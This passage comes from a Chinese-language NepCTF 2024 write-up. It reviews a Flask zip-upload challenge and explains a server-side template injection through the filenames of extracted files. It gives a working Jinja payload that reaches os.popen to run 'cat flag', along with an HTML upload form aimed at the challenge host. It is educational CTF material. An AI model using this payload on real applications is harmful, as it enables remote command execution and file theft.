punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Please use POST method to upload files.'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_uploads_folder<span class="token punctuation">(</span><span class="token punctuation">)</span>        files <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tp_file'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> files<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No file uploaded.'</span>        file_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>files<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        files<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        file_extension <span class="token operator">=</span> files<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> file_extension <span class="token operator">!=</span> <span class="token string">'zip'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid file type. Please upload a .zip file.'</span>        timestamp <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>        md5_dir_name <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>timestamp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        unzip_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> md5_dir_name<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> ZipFile<span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token keyword">as</span> zip_file<span class="token punctuation">:</span>            zip_file<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span>unzip_folder<span class="token punctuation">)</span>        files_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>                relative_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>relpath<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                link <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'&lt;a href="/cat?file=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>relative_path<span class="token punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span></span><span class="token string">&lt;/a>'</span></span>                files_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid filename.'</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'An error occurred. Please check your file and try again.'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/cat'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> file_path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File path is missing.'</span>    new_file <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>commonprefix<span class="token punctuation">(</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid file path.'</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>islink<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Symbolic links are not allowed.'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> file_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        content <span class="token operator">=</span> read_large_file<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span>content<span class="token operator">=</span>content<span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">,</span>dates<span class="token operator">=</span>Exec_date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File not found.'</span>    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Error reading file: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token keyword">def</span> <span class="token function">Exec_date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    d_res <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> d_res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>d_res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">clear_uploads_folder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> topdown<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token builtin">dir</span> <span class="token keyword">in</span> dirs<span class="token punctuation">:</span>            os<span class="token punctuation">.</span>rmdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_large_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            content <span class="token operator">+=</span> line    <span class="token keyword">return</span> content<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token string">"8000"</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¡ä¸€ä¸‹ä»£ç </p><p>é¦–å…ˆæ˜¯<code>/</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Please use POST method to upload files.'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_uploads_folder<span class="token punctuation">(</span><span class="token punctuation">)</span>        files <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tp_file'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> files<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No file uploaded.'</span>        file_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>files<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        files<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        file_extension <span class="token operator">=</span> files<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> file_extension <span class="token operator">!=</span> <span class="token string">'zip'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid file type. Please upload a .zip file.'</span>        timestamp <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>        md5_dir_name <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>timestamp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        unzip_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> md5_dir_name<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> ZipFile<span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token keyword">as</span> zip_file<span class="token punctuation">:</span>            zip_file<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span>unzip_folder<span class="token punctuation">)</span>        files_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>                relative_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>relpath<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                link <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'&lt;a href="/cat?file=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>relative_path<span class="token punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span></span><span class="token string">&lt;/a>'</span></span>                files_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid filename.'</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'An error occurred. Please check your file and try again.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ zipå¹¶è§£å‹çš„åŠŸèƒ½ï¼Œä¸å†™å‰ç«¯æ˜¯å§ğŸ˜¡</p><p>ä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«è§£å‹ï¼Œç„¶ååœ¨ &#x2F;cat è·¯ç”±åˆ›å»ºä¸€ä¸ªæ–‡ä»¶è¯»å–çš„é“¾æ¥</p><p>å†çœ‹ä¸€ä¸‹ &#x2F;cat</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/cat'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> file_path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File path is missing.'</span>    new_file <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>commonprefix<span class="token punctuation">(</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid file path.'</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>islink<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Symbolic links are not allowed.'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> file_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        content <span class="token operator">=</span> read_large_file<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span>content<span class="token operator">=</span>content<span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">,</span>dates<span class="token operator">=</span>Exec_date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File not found.'</span>    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Error reading file: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>banäº†ç›®å½•ç©¿è¶Šå’Œè½¯é“¾æ¥</p><p>ç”¨é‡å†™è¿‡çš„<code>render_template</code>å¯¹è¯»å–çš„å†…å®¹è¿›è¡Œæ¸²æŸ“</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">template_env <span class="token operator">=</span> Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>FileSystemLoader<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> autoescape<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>get_template<span class="token punctuation">(</span>template_name<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template_string</span><span class="token punctuation">(</span>template_string<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span>template_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾ä¸èƒ½ä»æ–‡ä»¶å†…å®¹å’Œæ–‡ä»¶åä¸Šè¿›è¡Œsstiã€‚ã€‚ã€‚å—ï¼Ÿ</p><p>ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¿©çš„å·®åˆ«ï¼Œå‰è€…æ˜¯ä»æ–‡ä»¶åŠ è½½æ¨¡æ¿ï¼Œåè€…æ˜¯åŠ¨æ€ç”Ÿæˆæ¨¡æ¿å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´åè€…å¯ä»¥è¿›è¡Œssti</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦ä¸Šä¼ çš„å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶åä¸ºæˆ‘ä»¬çš„payloadï¼š</p><pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token variable">__class__</span><span class="token punctuation">.</span><span class="token variable">__base__</span><span class="token punctuation">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">__init__</span><span class="token punctuation">.</span><span class="token variable">__globals__</span><span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cd ..;cat flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‹ç¼©åä¸Šä¼ ï¼Œè‡ªå·±å‡†å¤‡ä¸ªä¸Šä¼ è¡¨å•</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>æœ¬åœ°æ–‡ä»¶ä¸Šä¼ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://neptune-21540.nepctf.lemonprefect.cn/<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tp_file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å­è§£å‹åå›æ˜¾çš„å°±æ˜¯flagäº†ï¼ˆå›¾ç”¨çš„æ™¨æ›¦å¸ˆå‚…çš„ï¼‰</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240831122617710.png" alt="image-20240831122617710"></p><hr><h1 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h1><p>éé¢„æœŸæŠ¢äº†ä¸ª3è¡€</p><pre 